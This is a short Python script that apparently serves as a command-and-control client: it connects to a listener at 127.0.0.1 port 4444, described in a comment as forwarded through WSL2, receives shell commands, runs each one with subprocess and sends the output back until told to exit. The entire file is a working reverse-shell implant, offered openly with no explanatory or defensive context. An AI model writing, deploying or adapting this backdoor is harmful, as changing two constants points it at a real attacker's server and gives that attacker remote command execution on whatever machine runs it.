#!/usr/bin/env python3
import socket
import subprocess

SERVER_IP = "127.0.0.1"  # Localhost (WSL2)
SERVER_PORT = 4444        # Ensure this matches your forwarded port

def connect_to_server():
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((SERVER_IP, SERVER_PORT))
        print(f"[*] Connected to C2 server at {SERVER_IP}:{SERVER_PORT}")
        
        while True:
            cmd = client.recv(1024).decode().strip()
            if cmd.lower() == 'exit':
                break
            output = subprocess.getoutput(cmd)
            client.send(output.encode())
            
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        client.close()

if __name__ == "__main__":
    connect_to_server()
